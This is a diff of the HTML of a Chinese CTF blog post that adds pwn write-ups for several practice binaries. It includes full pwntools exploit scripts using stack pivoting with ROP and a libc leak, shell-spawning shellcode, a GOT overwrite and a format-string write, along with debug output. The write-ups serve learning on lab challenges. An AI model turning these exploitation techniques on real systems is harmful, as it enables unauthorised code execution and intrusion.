@@ -15,10 +15,13 @@
 
 0ctf_2017_babyheap详解
 
-picoctf_2018_got_shell程序流程
-能给任意地址写入四个字节数据，32位。
-而且给了后门函数，直接修改puts的got表位win的地址即可。
-注">
+wustctf2020_closed常用文件描述符
+stdin：0
+stdout：1
+stderr：2
+
+程序流程
+关闭了输出流和错误流，然后直接给了shell，">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -150,7 +153,56 @@ var _hmt = _hmt || [];
 <ul>
 <li><a href="https://warm-winter.github.io/2021/04/19/0ctf-2017-babyheap/" target="_blank" rel="noopener">0ctf_2017_babyheap详解</a></li>
 </ul>
-<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
+<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h2><h3 id="常用文件描述符"><a href="#常用文件描述符" class="headerlink" title="常用文件描述符"></a>常用文件描述符</h3><ul>
+<li>stdin：0</li>
+<li>stdout：1</li>
+<li>stderr：2</li>
+</ul>
+<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
+<p>关闭了输出流和错误流，然后直接给了shell，但是没有输出。</p>
+</blockquote>
+<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210430210044168.png" alt="image-20210430210044168"></p>
+<p>方法：</p>
+<h3 id="stdout重定向"><a href="#stdout重定向" class="headerlink" title="stdout重定向"></a>stdout重定向</h3><p>简单来说，既然stdout的文件描述符不可用，可以对stdout重定向，将文件描述符 stdout（1）重定向到可用文件描述符 stdin（0）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec ACTF_2019_babystack</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;ACTF_2019_babystack&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="actf-2019-babystack-1"><a href="#actf-2019-babystack-1" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><blockquote>
+<p><del>吐了，，，思路一样，不对</del></p>
+</blockquote>
+<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
+<p>最多可以输入0xe0个字节，但是s在rbp-0xd0。</p>
+<p>故最多可以溢出rbp和返回地址，所以需要栈迁移。</p>
+<p>程序给了栈地址，直接在栈上布置即可。</p>
+<ul>
+<li><p>rbp：fake stack</p>
+</li>
+<li><p>ret：leave_ret</p>
+</li>
+</ul>
+</blockquote>
+<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501162717088.png" alt="image-20210501162717088"></p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><blockquote>
+<p>自己不知道哪里错了，，，直接用师傅的<a href="https://www.cnblogs.com/luoleqi/p/13409781.html" target="_blank" rel="noopener">exp</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29408</span>)</span><br><span class="line"><span class="comment">#io = process('./ACTF_2019_babystack')</span></span><br><span class="line"><span class="comment">#io = process('./idaidg/linux_server64')</span></span><br><span class="line">elf = ELF(<span class="string">'./ACTF_2019_babystack'</span>)</span><br><span class="line"> </span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"> </span><br><span class="line">pop_rdi = <span class="number">0x400ad3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">start = <span class="number">0x4008f6</span></span><br><span class="line">leave = <span class="number">0x400a18</span></span><br><span class="line">ret = <span class="number">0x400a4f</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"How many bytes of your message?"</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"Your message will be saved at "</span>)</span><br><span class="line">addr = io.recv()[:<span class="number">14</span>]</span><br><span class="line">addr = int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u64(puts_addr))</span><br><span class="line">libcbase = u64(puts_addr) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"How many bytes of your message?"</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Your message will be saved at "</span>)</span><br><span class="line">addr = io.recv()[:<span class="number">14</span>]</span><br><span class="line">addr = int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h2><blockquote>
+<p>最简单的ret2shellcode题，把shellcode发过去就行。。。</p>
+</blockquote>
+<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>唯一的难点应该在于main函数不能反汇编，得看汇编。</p>
+<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501164740595.png" alt="image-20210501164740595"></p>
+<p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501164752604.png" alt="image-20210501164752604"></p>
+<p>vuln函数就是输入再打印。</p>
+<p>所以，程序流程就是输入数据，并且会直接改数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29061</span>)</span><br><span class="line">elf = ELF(<span class="string">'./PicoCTF_2018_shellcode'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><h3 id="程序流程-2"><a href="#程序流程-2" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
 <p>能给任意地址写入四个字节数据，32位。</p>
 <p>而且给了后门函数，直接修改puts的got表位win的地址即可。</p>
 <p>注意一点：发送数据应该发送的是整数，也就是hex()，而不是p32()，它是字符。</p>
@@ -158,6 +210,36 @@ var _hmt = _hmt || [];
 <p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419145953699.png" alt="image-20210419145953699"></p>
 <p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419150030225.png" alt="image-20210419150030225"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25946</span>)</span><br><span class="line">elf = ELF(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">win = elf.symbols[<span class="string">'win'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value?"</span>)</span><br><span class="line">p.sendline(hex(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"like"</span>)</span><br><span class="line">p.sendline(hex(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><blockquote>
+<p>一道格式化字符串，，，，不知道为什么用pwntools工具不好使，，，</p>
+</blockquote>
+<h3 id="程序流程-3"><a href="#程序流程-3" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501231211604.png" alt="image-20210501231211604"></p>
+<p>输入字符串，格式化字符串</p>
+<p>一个判断，满足判断即可获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> judge <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">	<span class="keyword">if</span>( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span>):</span><br><span class="line">		<span class="keyword">print</span> judge</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ python equation.py </span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>故只要judge为2即可。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用格式化字符串将judge的值变为2即可。</p>
+<p>方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;bb%9$naaa&quot;+p64(judge)</span><br></pre></td></tr></table></figure>
+
+<h4 id="8不是9"><a href="#8不是9" class="headerlink" title="8不是9"></a>8不是9</h4><p>8</p>
+<blockquote>
+<p>只发送了0xf个字节，到1的时候就没了，，，后门的并没有发送过去。。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;bb%8$n&quot;+p64(judge)	&#x3D;&gt;	将%8$n之前的字节数，也就是2，写入到offse&#x3D;8的位置，也就是%8$n后面的judge</span><br><span class="line"></span><br><span class="line">[DEBUG] Sent 0xf bytes:</span><br><span class="line">    00000000  62 62 25 38  24 6e 5c 10  60 00 00 00  00 00 0a     │bb%8│$n\·│&#96;···│···│</span><br><span class="line">    0000000f</span><br></pre></td></tr></table></figure>
+
+<p>9</p>
+<blockquote>
+<p>发送了12个字节，都发送过去了。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;bb%9$naaa&quot;+p64(judge)	&#x3D;&gt;	将%9$n之前的字节数，也就是2，写入到offse&#x3D;9的位置，因为偏移为8，而judge前面刚好9个字节，一开始就少一个，所以offset&#x3D;9的位置刚好在前面九个字符之后。</span><br><span class="line"></span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    00000000  62 62 25 39  24 6e 61 61  61 5c 10 60  00 00 00 00  │bb%9│$naa│a\·&#96;│····│</span><br><span class="line">    00000010  00 0a</span><br></pre></td></tr></table></figure>
+
+<p>emmm，字节对齐？</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for judge in range(200):</span></span><br><span class="line"><span class="comment"># 	if( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198):</span></span><br><span class="line"><span class="comment"># 		print judge</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./wdb_2018_2nd_easyfmt")</span></span><br><span class="line">p=process(<span class="string">"./mrctf2020_easy_equation"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28245</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">judge = <span class="number">0x60105C</span></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(offset,&#123;judge:2&#125;)</span></span><br><span class="line">payload = <span class="string">"bb%9$naaa"</span>+p64(judge)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 	  
 	</div>
@@ -214,7 +296,7 @@ var _hmt = _hmt || [];
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/pwn/">pwn<span>9</span></a></li>
+    <li><a href="/categories/pwn/">pwn<span>8</span></a></li>
   </li>
 
     </ul>
@@ -238,7 +320,7 @@ var _hmt = _hmt || [];
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0ctf-2017-babyheap"><span class="toc-article-text">0ctf_2017_babyheap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#picoctf-2018-got-shell"><span class="toc-article-text">picoctf_2018_got_shell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#exp"><span class="toc-article-text">exp</span></a></li></ol></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0ctf-2017-babyheap"><span class="toc-article-text">0ctf_2017_babyheap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#wustctf2020-closed"><span class="toc-article-text">wustctf2020_closed</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#常用文件描述符"><span class="toc-article-text">常用文件描述符</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#stdout重定向"><span class="toc-article-text">stdout重定向</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#actf-2019-babystack"><span class="toc-article-text">actf_2019_babystack</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#actf-2019-babystack-1"><span class="toc-article-text">actf_2019_babystack</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-1"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#完整exp"><span class="toc-article-text">完整exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#picoctf-2018-shellcode"><span class="toc-article-text">picoctf_2018_shellcode</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#难点"><span class="toc-article-text">难点</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#picoctf-2018-got-shell"><span class="toc-article-text">picoctf_2018_got_shell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-2"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#exp"><span class="toc-article-text">exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mrctf2020-easy-equation"><span class="toc-article-text">mrctf2020_easy_equation</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-3"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#漏洞利用"><span class="toc-article-text">漏洞利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#8不是9"><span class="toc-article-text">8不是9</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#exp-1"><span class="toc-article-text">exp</span></a></li></ol></li></ol>
 		</div>
 	
 	</div>
